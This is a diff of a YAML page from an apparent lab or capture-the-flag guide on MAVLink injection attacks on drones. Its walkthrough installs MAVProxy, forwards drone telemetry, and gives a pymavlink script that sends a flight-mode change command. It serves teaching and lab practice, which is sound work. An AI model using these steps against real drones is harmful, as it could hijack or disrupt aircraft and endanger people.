@@ -5,34 +5,33 @@ breadcrumb:
     link: /attacks
   - text: Injection
   - text: MAVLink Injection Attack
-
 sections:
   - title: Description
-    content: |
-      A MAVLink injection attack involves intercepting and injecting malicious MAVLink messages into the communication between a drone and its ground control station. 
-      This can be used to alter the behavior of the drone, such as changing its flight path, altering flight modes, or disrupting its operation.
+    content: >
+      A MAVLink injection attack involves intercepting and injecting malicious MAVLink messages into the communication
+      between a drone and its ground control station. 
 
+      This can be used to alter the behavior of the drone, such as changing its flight path, altering flight modes, or
+      disrupting its operation.
   - title: Resources
     content:
       - text: MAVLink
         link: https://mavlink.io/en/
       - text: MAVProxy
         link: https://github.com/ArduPilot/MAVProxy
-
   - title: Solution Guide
     collapsible: true
     steps:
       - title: Step 1
-        description: | 
+        description: |
           Install MAVProxy
 
-          ```sudo apt-get install python3-dev python3-opencv python3-wxgtk4.0 python3-pip python3-matplotlib python3-lxml python3-pygame
+          ```# Already pre-installed in the Web Range AttackBox (zero-egress lab)
           pip3 install PyYAML mavproxy --user
           echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc
           ```
-
       - title: Step 2
-        description: | 
+        description: |
           Launch MAVProxy and connect to the drone. You need to specify the connection string for serial or UDP.
 
           ```mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft
@@ -40,28 +39,35 @@ sections:
 
           ```mavproxy.py --master=udp:127.0.0.1:14550
           ```
-
       - title: Step 3
-        description: | 
-          Enable MAVLink message injection by setting up a forwarding system or by directly injecting messages into the communication stream.
+        description: >
+          Enable MAVLink message injection by setting up a forwarding system or by directly injecting messages into the
+          communication stream.
+
 
           ```mavproxy.py --master=udp:127.0.0.1:14550 --out=udp:127.0.0.1:14551
-          ```
 
-      
+          ```
       - title: Step 4
-        description: |
+        description: >
           Consider using a script to automate the process. Here is an example using Python and pymavlink:
+
 
           ```from pymavlink import mavutil
 
+
           # Create the connection
+
           master = mavutil.mavlink_connection('udp:127.0.0.1:14550')
 
+
           # Wait for a heartbeat before sending commands
+
           master.wait_heartbeat()
 
+
           # Create and send a custom MAVLink message
+
           msg = master.mav.command_long_encode(
               1, 1,    # target system, target component
               mavutil.mavlink.MAV_CMD_DO_SET_MODE, # command
@@ -69,8 +75,11 @@ sections:
               1, 0, 4, # param 1-3: custom mode (e.g., flight mode)
               0, 0, 0, 0 # param 4-7: not used
           )
+
           master.mav.send(msg)
+
           ```
 
-          Ensure that the script is executed with appropriate permissions and that it is connected to the correct MAVLink endpoint.
 
+          Ensure that the script is executed with appropriate permissions and that it is connected to the correct
+          MAVLink endpoint.
